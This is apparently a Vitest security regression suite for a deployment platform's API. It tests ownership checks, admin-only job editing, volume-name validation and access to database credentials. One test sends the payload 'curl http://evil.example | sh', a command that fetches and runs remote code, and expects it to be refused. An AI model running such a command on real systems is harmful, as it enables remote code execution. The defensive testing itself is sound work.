import { beforeEach, describe, expect, it, vi } from 'vitest';
import { attachmentRoutes, databasesRoutes } from '../src/modules/databases.js';
import { deploysRoutes } from '../src/modules/deploys.js';
import { envRoutes } from '../src/modules/env.js';
import { jobRoutes } from '../src/modules/jobs.js';
import { servicesRoutes } from '../src/modules/services.js';
import { webhookMgmtRoutes } from '../src/modules/hooks.js';
import { encrypt } from '../src/lib/crypto.js';
import { asUser, buildTestApp, createFakeDb, dbRow, svcRow, type FakeDbOpts } from './helpers.js';

const execMocks = vi.hoisted(() => ({
  capture: vi.fn(async () => 'out'),
  run: vi.fn(async (_c: unknown, _a: unknown, _o: unknown, sink?: (l: string) => void) => { sink?.('out'); }),
}));
vi.mock('../src/lib/exec.js', () => execMocks);

const engineMocks = vi.hoisted(() => ({
  startDatabase: vi.fn(async (_d: unknown, log: (l: string) => void) => { log('starting'); }),
  stopDatabase: vi.fn(async () => undefined),
  restartDatabase: vi.fn(async () => undefined),
  databaseLogs: vi.fn(async () => ['log line']),
  connectionString: vi.fn(() => 'postgres://nine:secret@nd-db-pg:5432/app'),
  defaultPort: vi.fn(() => 5432),
  startDatabaseStudio: vi.fn(async () => undefined),
  stopDatabaseStudio: vi.fn(async () => undefined),
  adoptRetainedVolume: vi.fn(async () => ({ action: 'fresh' as const })),
}));
vi.mock('../src/engine/database.js', async (importOriginal) => {
  // Spread the real module so pure helpers (needsVolumeAdoption) stay real;
  // the docker-touching surface comes from engineMocks below.
  const actual = await importOriginal<typeof import('../src/engine/database.js')>();
  return {
    ...actual,
    ENGINES: { postgres: { username: () => 'nine', dbName: () => 'app' } },
    ...engineMocks,
  };
});

const proxyMocks = vi.hoisted(() => ({
  writeDynamicConfig: vi.fn(async () => undefined),
  NETWORK: 'ninedeploy',
}));
vi.mock('../src/engine/proxy.js', () => proxyMocks);

const pm2Mocks = vi.hoisted(() => ({
  connect: vi.fn((cb: (err?: Error | null) => void) => cb(null)),
  disconnect: vi.fn(),
  stop: vi.fn((_n: string, cb: (e?: Error | null) => void) => cb(null)),
  restart: vi.fn((_n: string, cb: (e?: Error | null) => void) => cb(null)),
  delete: vi.fn((_n: string, cb: (e?: Error | null) => void) => cb(null)),
  describe: vi.fn((_n: string, cb: (e: Error | null, d?: unknown[]) => void) => cb(null, [])),
}));
vi.mock('pm2', () => ({ default: pm2Mocks }));

vi.mock('../src/lib/jobRunner.js', () => ({ runJob: vi.fn(async () => undefined) }));

const configMock = vi.hoisted(() => ({
  wildcardDomain: '',
  isProd: false,
  publicUrl: 'http://localhost:3000',
  paths: { dataDir: '/tmp', masterKeyFile: '/tmp/master.key' },
  jwt: { secret: 'x', accessTtl: '15m', refreshTtl: '7d' },
}));
vi.mock('../src/config.js', () => ({ config: configMock }));

const MEMBER = 7;
const OWNER = 42;
/** A service owned by user 42 — the "other member" from user 7's perspective. */
const ownedByOther = svcRow({ id: 3, ownerUserId: OWNER, runtimeId: 'nd-svc-web' });

beforeEach(() => {
  vi.clearAllMocks();
});

describe('K2: service-scoped routes enforce ownership for members', () => {
  async function appWith(overrides: FakeDbOpts = {}) {
    const app = await buildTestApp({
      db: createFakeDb({ findFirst: { services: ownedByOther }, ...overrides }),
    });
    await app.register(servicesRoutes, { prefix: '/services' });
    await app.register(deploysRoutes, { prefix: '/services' });
    await app.register(envRoutes, { prefix: '/services' });
    await app.register(webhookMgmtRoutes, { prefix: '/services' });
    await app.register(jobRoutes, { prefix: '/services' });
    // attachmentRoutes was missing here, so the /attachments case below was
    // asserting Fastify's route-not-found 404 rather than the ownership 404 —
    // it would have passed with the access check removed entirely.
    await app.register(attachmentRoutes, { prefix: '/services' });
    return app;
  }

  const memberCases: Array<[string, string, string]> = [
    ['GET /services/:id', 'GET', '/services/3'],
    ['DELETE /services/:id', 'DELETE', '/services/3'],
    ['POST /services/:id/stop', 'POST', '/services/3/stop'],
    ['POST /services/:id/deploys', 'POST', '/services/3/deploys'],
    ['GET /services/:id/env', 'GET', '/services/3/env'],
    ['POST /services/:id/webhooks', 'POST', '/services/3/webhooks'],
    ['GET /services/:id/jobs', 'GET', '/services/3/jobs'],
    ['GET /services/:id/attachments', 'GET', '/services/3/attachments'],
  ];

  for (const [label, method, url] of memberCases) {
    it(`member is denied (404) on another member's service — ${label}`, async () => {
      const app = await appWith();
      const res = await app.inject({ method, url, headers: asUser({ id: MEMBER, isOperator: false }) });
      expect(res.statusCode, `${method} ${url} by non-owner member`).toBe(404);
    });
  }

  it('the owner member and admins can still access the same service', async () => {
    const app = await appWith();
    const asOwner = await app.inject({ method: 'GET', url: '/services/3', headers: asUser({ id: OWNER, isOperator: false }) });
    expect(asOwner.statusCode).toBe(200);
    const asAdmin = await app.inject({ method: 'GET', url: '/services/3', headers: asUser({ id: 1, isOperator: true }) });
    expect(asAdmin.statusCode).toBe(200);
  });

  it('POST /v1/services records the creating user as ownerUserId', async () => {
    let inserted: Record<string, unknown> | null = null;
    const app = await buildTestApp({
      db: createFakeDb({
        insert: {
          services: (v: Record<string, unknown>) => {
            inserted = v;
            return [svcRow({ id: 9 })];
          },
        },
      }),
    });
    await app.register(servicesRoutes, { prefix: '/services' });
    const res = await app.inject({
      method: 'POST',
      url: '/services',
      headers: asUser({ id: MEMBER, isOperator: false }),
      payload: { name: 'Owned App', type: 'docker', repoUrl: 'https://x/y.git', branch: 'main', build: { buildPack: 'auto', baseDir: '/' } },
    });
    expect(res.statusCode).toBe(200);
    expect(inserted).toMatchObject({ ownerUserId: MEMBER });
  });

  // Asserts the OUTCOME rather than the shape of the drizzle `where`: service
  // visibility moved into the shared `visibleServiceIdSet` helper so
  // `GET /v1/services`, `/dashboard` and `/domains` stop disagreeing, and the
  // owner match is applied to the loaded rows instead of the SQL predicate.
  it('the list shows a member only their own services, and admins everything', async () => {
    const mine = svcRow({ id: 1, slug: 'mine', ownerUserId: MEMBER });
    const theirs = svcRow({ id: 2, slug: 'theirs', ownerUserId: OWNER });
    const app = await buildTestApp({
      db: createFakeDb({
        findMany: { services: [mine, theirs] },
        // `visibleServiceIdSet` re-selects the caller's owned rows; the fake db
        // ignores `where`, so branch on the projection to model it.
        select: {
          services: (cols: unknown) => (cols ? [{ id: mine.id }] : [mine, theirs]),
        },
      }),
    });
    await app.register(servicesRoutes, { prefix: '/services' });

    const asMember = await app.inject({
      method: 'GET',
      url: '/services',
      headers: asUser({ id: MEMBER, isOperator: false }),
    });
    expect(asMember.statusCode).toBe(200);
    expect(asMember.json().map((s: { id: number }) => s.id)).toEqual([1]);

    const asAdmin = await app.inject({
      method: 'GET',
      url: '/services',
      headers: asUser({ id: 1, isOperator: true }),
    });
    expect(asAdmin.statusCode).toBe(200);
    expect(asAdmin.json().map((s: { id: number }) => s.id)).toEqual([1, 2]);
  });
});

describe('jobs: editing an existing exec job stays admin-only (HIGH fix)', () => {
  it('a member cannot rewrite the command of an existing exec job', async () => {
    const app = await buildTestApp({
      db: createFakeDb({
        findFirst: {
          services: svcRow({ id: 3, ownerUserId: MEMBER }),
          scheduledJobs: { id: 11, serviceId: 3, name: 'j', cron: '* * * * *', kind: 'exec', command: 'uptime', enabled: true, lastRunAt: null, createdAt: new Date() },
        },
      }),
    });
    await app.register(jobRoutes, { prefix: '/services' });
    const res = await app.inject({
      method: 'PATCH',
      url: '/services/3/jobs/11',
      headers: asUser({ id: MEMBER, isOperator: false }),
      payload: { command: 'curl http://evil.example | sh' },
    });
    expect(res.statusCode).toBe(403);
  });
});

describe('K5: existingVolume must be a docker volume name', () => {
  async function createDbApp(volume: string) {
    const app = await buildTestApp({ db: createFakeDb({ insert: { databases: [dbRow({ id: 5 })] }, findFirst: { databases: dbRow({ id: 5, status: 'running' }) } }) });
    await app.register(databasesRoutes, { prefix: '/databases' });
    return app.inject({
      method: 'POST',
      url: '/databases',
      headers: asUser({ id: MEMBER, isOperator: false }),
      payload: { name: 'Evil', engine: 'postgres', existingVolume: volume },
    });
  }

  it('rejects host-path bind-mount operands', async () => {
    for (const bad of ['/etc', '/:/x', 'a:b', 'name with space', ':x']) {
      const res = await createDbApp(bad);
      expect(res.statusCode, `existingVolume=${JSON.stringify(bad)}`).toBe(400);
    }
  });

  it('accepts a plain docker volume name', async () => {
    let inserted: Record<string, unknown> | null = null;
    const app = await buildTestApp({
      db: createFakeDb({
        insert: {
          databases: (v: Record<string, unknown>) => {
            inserted = v;
            return [dbRow({ id: 5 })];
          },
        },
        findFirst: { databases: dbRow({ id: 5, status: 'running' }) },
      }),
    });
    await app.register(databasesRoutes, { prefix: '/databases' });
    const res = await app.inject({
      method: 'POST',
      url: '/databases',
      headers: asUser({ id: MEMBER, isOperator: false }),
      payload: { name: 'Evil', engine: 'postgres', existingVolume: 'nd-db-imported-data' },
    });
    expect(res.statusCode).toBe(200);
    expect(inserted).toMatchObject({ volumeName: 'nd-db-imported-data' });
  });
});

describe('K6: database credentials are admin-only', () => {
  async function dbApp() {
    const app = await buildTestApp({
      db: createFakeDb({
        findMany: {
          databases: [dbRow({ id: 1, ownerUserId: MEMBER, status: 'running', passwordEncrypted: encrypt('pw') })],
          // visibleDatabaseIds() requires workspace membership for visibility.
          // The member sees their owned DB (id=1) via the workspace join.
          workspaceMembers: async () => [
            { workspaceId: 1, userId: MEMBER, role: 'member', id: 1 },
          ],
        },
        findFirst: { databases: dbRow({ id: 1, ownerUserId: MEMBER, status: 'running', passwordEncrypted: encrypt('pw') }) },
        select: { databases: [dbRow({ id: 1, name: 'my-db' })] },
      }),
    });
    await app.register(databasesRoutes, { prefix: '/databases' });
    return app;
  }

  it('the list omits the password-embedded connection string for members', async () => {
    const app = await dbApp();
    const res = await app.inject({ method: 'GET', url: '/databases', headers: asUser({ id: MEMBER, isOperator: false }) });
    expect(res.statusCode).toBe(200);
    expect(res.json()[0]).toMatchObject({ connectionString: null });
    expect(JSON.stringify(res.body)).not.toContain('secret');
  });

  it('admins still receive the connection string', async () => {
    const app = await dbApp();
    const res = await app.inject({ method: 'GET', url: '/databases', headers: asUser({ id: 1, isOperator: true }) });
    expect(res.json()[0]).toMatchObject({ connectionString: 'postgres://nine:secret@nd-db-pg:5432/app' });
  });

  // The line moved with the workspace role hierarchy: the gate is now `admin`
  // ON THE DATABASE, not "instance operator". A plain member with access still
  // cannot read the password; the database's own owner can — it used to be
  // operator-only, so the creator of a database could not read its credentials,
  // which is stricter than the published matrix and unusable for a team.
  it('GET /databases/:id/credentials refuses a member who merely has access', async () => {
    const app = await buildTestApp({
      db: createFakeDb({
        // Owned by someone else, shared through a workspace the caller is a
        // plain `member` of.
        findFirst: {
          databases: dbRow({ id: 1, ownerUserId: OWNER, projectId: 5, status: 'running', passwordEncrypted: encrypt('pw') }),
          projects: { id: 5, workspaceId: 1, name: 'P', slug: 'p' },
          workspaceMembers: { id: 1, workspaceId: 1, userId: MEMBER, role: 'member' },
        },
      }),
    });
    await app.register(databasesRoutes, { prefix: '/databases' });
    const denied = await app.inject({
      method: 'GET',
      url: '/databases/1/credentials',
      headers: asUser({ id: MEMBER, isOperator: false }),
    });
    expect(denied.statusCode).toBe(403);
  });

  it('GET /databases/:id/credentials allows the owner and an operator', async () => {
    const app = await dbApp();
    const owner = await app.inject({ method: 'GET', url: '/databases/1/credentials', headers: asUser({ id: MEMBER, isOperator: false }) });
    expect(owner.statusCode).toBe(200);
    expect(owner.json()).toMatchObject({ password: 'pw' });
    const allowed = await app.inject({ method: 'GET', url: '/databases/1/credentials', headers: asUser({ id: 1, isOperator: true }) });
    expect(allowed.statusCode).toBe(200);
    expect(allowed.json()).toMatchObject({ password: 'pw' });
  });
});

describe('database attachments: a workspace viewer is read-only', () => {
  /** Service 3 owned by OWNER, tagged into workspace 1; MEMBER holds a
   *  `viewer` seat there. Attaching injects the database's decrypted
   *  connection string into the service env at deploy time, so a viewer
   *  must not be able to do it. */
  const viewerDb = (extra: Record<string, unknown> = {}) =>
    createFakeDb({
      findFirst: {
        services: svcRow({ id: 3, ownerUserId: OWNER, runtimeId: 'nd-svc-web' }),
        databases: dbRow({ id: 1, ownerUserId: OWNER, projectId: 5, status: 'running', passwordEncrypted: encrypt('pw') }),
        projects: { id: 5, workspaceId: 1, name: 'P', slug: 'p' },
        workspaceMembers: { id: 1, workspaceId: 1, userId: MEMBER, role: 'viewer' },
      },
      findMany: {
        serviceWorkspaces: [{ id: 1, serviceId: 3, workspaceId: 1 }],
        workspaceMembers: [{ id: 1, workspaceId: 1, userId: MEMBER, role: 'viewer' }],
      },
      ...extra,
    });

  it('POST /services/:id/attachments is denied for a viewer (403)', async () => {
    const app = await buildTestApp({ db: viewerDb() });
    await app.register(attachmentRoutes, { prefix: '/services' });
    const res = await app.inject({
      method: 'POST',
      url: '/services/3/attachments',
      headers: asUser({ id: MEMBER, isOperator: false }),
      payload: { databaseId: 1 },
    });
    expect(res.statusCode).toBe(403);
  });

  it('DELETE /services/:id/attachments/:attId is denied for a viewer (403)', async () => {
    const app = await buildTestApp({ db: viewerDb() });
    await app.register(attachmentRoutes, { prefix: '/services' });
    const res = await app.inject({
      method: 'DELETE',
      url: '/services/3/attachments/9',
      headers: asUser({ id: MEMBER, isOperator: false }),
    });
    expect(res.statusCode).toBe(403);
  });

  it('a plain member can still attach (the floor is member, not admin)', async () => {
    const db = createFakeDb({
      findFirst: {
        services: svcRow({ id: 3, ownerUserId: OWNER, runtimeId: 'nd-svc-web' }),
        databases: dbRow({ id: 1, ownerUserId: OWNER, projectId: 5, status: 'running', passwordEncrypted: encrypt('pw') }),
        projects: { id: 5, workspaceId: 1, name: 'P', slug: 'p' },
        workspaceMembers: { id: 1, workspaceId: 1, userId: MEMBER, role: 'member' },
      },
      findMany: {
        serviceWorkspaces: [{ id: 1, serviceId: 3, workspaceId: 1 }],
        workspaceMembers: [{ id: 1, workspaceId: 1, userId: MEMBER, role: 'member' }],
      },
      insert: { database_attachments: [{ id: 9, serviceId: 3, databaseId: 1, envAlias: 'DATABASE_URL' }] },
    });
    const app = await buildTestApp({ db });
    await app.register(attachmentRoutes, { prefix: '/services' });
    const res = await app.inject({
      method: 'POST',
      url: '/services/3/attachments',
      headers: asUser({ id: MEMBER, isOperator: false }),
      payload: { databaseId: 1 },
    });
    expect(res.statusCode).toBe(200);
    expect(res.json()).toMatchObject({ id: 9, databaseId: 1 });
  });
});
